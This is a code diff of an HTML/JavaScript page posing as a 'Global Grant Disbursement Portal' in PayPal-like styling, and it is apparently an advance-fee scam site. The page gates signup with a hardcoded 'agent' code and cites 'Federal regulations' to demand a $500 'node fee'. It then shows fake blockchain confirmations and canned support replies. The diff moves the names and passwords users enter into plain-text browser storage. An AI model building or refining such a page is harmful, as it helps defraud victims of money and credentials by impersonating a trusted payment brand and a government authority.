@@ -12,17 +12,12 @@
         .pp-bg-blue { background-color: #0070ba; }
         .hidden { display: none !important; }
         .animated-hero {
-            background: linear-gradient(-45deg, #003087, #0070ba, #005ea6, #002c87);
-            background-size: 400% 400%;
-            animation: gradient 12s ease infinite;
+            background: linear-gradient(-45deg, #003087, #0070ba, #003087);
+            background-size: 200% 200%;
+            animation: gradient 8s ease infinite;
             position: relative;
         }
         @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        .hero-overlay {
-            position: absolute; inset: 0;
-            background: url('https://images.unsplash.com/photo-1556740758-90de374c12ad?auto=format&fit=crop&q=80') center/cover;
-            opacity: 0.15; mix-blend-mode: overlay;
-        }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0070ba; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .progress-bar-fill { transition: width 2s ease-in-out; }
@@ -43,9 +38,8 @@
             </div>
             <nav class="space-y-8 text-lg font-light">
                 <button onclick="showPage('dashboard')" class="block w-full text-left">Summary</button>
-                <button onclick="showPage('activity-page')" class="block w-full text-left">Activity</button>
                 <button onclick="alert('Verification in progress')" class="block w-full text-left">Wallet</button>
-                <button onclick="location.reload()" class="block w-full text-left pt-8 border-t border-blue-800 opacity-50">Log Out</button>
+                <button onclick="localStorage.clear(); location.reload();" class="block w-full text-left pt-8 border-t border-blue-800 opacity-50">Log Out</button>
             </nav>
         </div>
     </div>
@@ -85,7 +79,6 @@
             </div>
         </nav>
         <section class="animated-hero h-[500px] flex items-center justify-center text-center px-6 text-white relative">
-            <div class="hero-overlay"></div>
             <div class="relative z-10 max-w-3xl">
                 <h1 class="text-5xl md:text-6xl font-light mb-6">Global Grant Disbursement Portal</h1>
                 <button onclick="showPage('signup-page')" class="px-14 py-4 bg-white text-blue-900 rounded-full font-bold text-xl shadow-2xl">Sign Up Now</button>
@@ -107,9 +100,7 @@
             
             <div class="relative">
                 <input id="reg-pass" type="password" placeholder="Create Password" class="w-full border p-4 rounded-md outline-none">
-                <button onclick="togglePass('reg-pass')" class="absolute right-4 top-4 text-gray-400">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
-                </button>
+                <button onclick="togglePass('reg-pass')" class="absolute right-4 top-4 text-gray-400">👁‍🗨</button>
             </div>
 
             <div class="relative">
@@ -128,7 +119,7 @@
             <p id="agent-status" class="text-xs font-bold"></p>
 
             <button onclick="handleSignup()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Create Account</button>
-            <p id="signup-error" class="text-red-600 text-xs text-center hidden font-bold">Please fill all fields and enter valid Agent ID</p>
+            <p id="signup-error" class="text-red-600 text-xs text-center hidden font-bold">Check all fields and Agent ID</p>
         </div>
     </div>
 
@@ -138,9 +129,7 @@
             <input id="login-email" type="text" placeholder="Email" class="w-full border p-4 rounded-md outline-none">
             <div class="relative">
                 <input id="login-pass" type="password" placeholder="Password" class="w-full border p-4 rounded-md outline-none">
-                <button onclick="togglePass('login-pass')" class="absolute right-4 top-4 text-gray-400">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
-                </button>
+                <button onclick="togglePass('login-pass')" class="absolute right-4 top-4 text-gray-400">👁‍🗨</button>
             </div>
             <button onclick="handleLogin()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold">Log In</button>
             <p id="login-error" class="text-red-600 text-xs text-center hidden font-bold">Invalid email or password</p>
@@ -198,8 +187,6 @@
     <div id="verify-page" class="hidden min-h-screen p-8 flex flex-col items-center justify-center text-center"><div class="w-16 h-16 bg-orange-100 text-orange-600 rounded-full flex items-center justify-center mb-6 text-2xl font-bold">!</div><h2 class="text-2xl font-bold mb-4">Verification Required</h2><p class="text-gray-500 text-sm mb-10 px-4">Federal regulations require a <b>$500.00</b> node fee to link your wallet.</p><button onclick="generateWallet()" class="w-full py-4 pp-bg-blue text-white rounded-full font-bold max-w-sm shadow-lg">Proceed to Payment</button></div>
 
     <script>
-        // Store user credentials locally for this session
-        let savedUser = { email: '', password: '', name: '' };
         let isAgentValid = false;
 
         function toggleSidebar() { document.getElementById('sidebar').classList.toggle('hidden'); }
@@ -231,7 +218,7 @@
         function validateAgent(val) {
             const status = document.getElementById('agent-status');
             if (val === "osie87ebi7i") {
-                status.innerText = "✓ Agent Anthony Verified"; status.className = "text-xs font-bold text-green-600";
+                status.innerText = "✓ Agent Verified"; status.className = "text-xs font-bold text-green-600";
                 isAgentValid = true;
             } else {
                 status.innerText = val === "" ? "" : "✕ Invalid Agent ID"; status.className = "text-xs font-bold text-red-600";
@@ -243,22 +230,23 @@
             const name = document.getElementById('reg-name').value;
             const email = document.getElementById('reg-email').value;
             const pass = document.getElementById('reg-pass').value;
-            
-            if (!name || !email || !pass || !isAgentValid) { 
-                document.getElementById('signup-error').classList.remove('hidden'); return; 
+            if (name && email && pass && isAgentValid) {
+                localStorage.setItem('userEmail', email);
+                localStorage.setItem('userPass', pass);
+                localStorage.setItem('userName', name);
+                document.getElementById('display-name').innerText = name.split(' ')[0];
+                document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
+                showLoading('Connecting to Hub...', 'dashboard');
+            } else {
+                document.getElementById('signup-error').classList.remove('hidden');
             }
-            
-            savedUser = { email, password: pass, name: name };
-            document.getElementById('display-name').innerText = name.split(' ')[0];
-            document.getElementById('user-initials').innerText = name.charAt(0).toUpperCase();
-            showLoading('Connecting to Disbursement Hub...', 'dashboard');
         }
 
         function handleLogin() {
             const email = document.getElementById('login-email').value;
             const pass = document.getElementById('login-pass').value;
-            
-            if (email === savedUser.email && pass === savedUser.password && email !== '') {
+            if (email === localStorage.getItem('userEmail') && pass === localStorage.getItem('userPass')) {
+                document.getElementById('display-name').innerText = localStorage.getItem('userName').split(' ')[0];
                 showLoading('Authenticating...', 'dashboard');
             } else {
                 document.getElementById('login-error').classList.remove('hidden');
@@ -274,38 +262,34 @@
 
         function copyAddr() { 
             navigator.clipboard.writeText(document.getElementById('wallet-addr').innerText); 
-            const btn = event.target; btn.innerText = "COPIED"; setTimeout(() => btn.innerText = "COPY", 2000);
+            event.target.innerText = "COPIED"; setTimeout(() => event.target.innerText = "COPY", 2000);
         }
 
         function confirmPayment() {
-            const txId = 'PX-' + Math.floor(Math.random() * 999999);
-            const historyItem = `<div class="flex justify-between border-t pt-4"><div><p class="text-sm font-bold">Node Fee</p><p class="text-[10px] text-gray-400 uppercase">ID: ${txId} • <span class="text-orange-500 font-bold">Pending</span></p></div><p class="text-gray-400 font-bold text-sm">-$500.00</p></div>`;
+            const historyItem = `<div class="flex justify-between border-t pt-4"><div><p class="text-sm font-bold">Node Fee</p><p class="text-[10px] text-orange-500 font-bold uppercase">Pending Confirmation</p></div><p class="text-gray-400 font-bold text-sm">-$500.00</p></div>`;
             document.getElementById('activity-list').insertAdjacentHTML('beforeend', historyItem);
             document.getElementById('status-container').classList.remove('hidden');
-            showLoading('Broadcasting to Blockchain...', 'dashboard');
-            setTimeout(() => {
-                document.getElementById('progress-fill').style.width = '33%';
-                document.getElementById('confirm-count').innerText = '1/3';
-            }, 5000);
+            showLoading('Broadcasting...', 'dashboard');
+            setTimeout(() => { document.getElementById('progress-fill').style.width = '33%'; document.getElementById('confirm-count').innerText = '1/3'; }, 5000);
         }
 
         function userSendMessage() {
             const input = document.getElementById('chat-input');
-            if(!input.value) return;
             const content = document.getElementById('chat-content');
+            if(!input.value) return;
             content.innerHTML += `<div class="text-right"><span class="bg-blue-100 p-2 rounded-lg inline-block text-gray-800">${input.value}</span></div>`;
             input.value = '';
             setTimeout(() => {
-                content.innerHTML += `<div><span class="bg-white border p-2 rounded-lg inline-block shadow-sm text-gray-600">Checking your transaction... Please wait.</span></div>`;
+                content.innerHTML += `<div><span class="bg-white border p-2 rounded-lg inline-block shadow-sm text-gray-600">Checking your status...</span></div>`;
                 content.scrollTop = content.scrollHeight;
-            }, 2000);
+            }, 1500);
         }
 
         function showLoading(text, next) {
             const l = document.getElementById('loading-screen');
             document.getElementById('loading-text').innerText = text;
             l.classList.remove('hidden');
-            setTimeout(() => { l.classList.add('hidden'); if(next) showPage(next); }, 2500);
+            setTimeout(() => { l.classList.add('hidden'); if(next) showPage(next); }, 2000);
         }
     </script>
 </body>
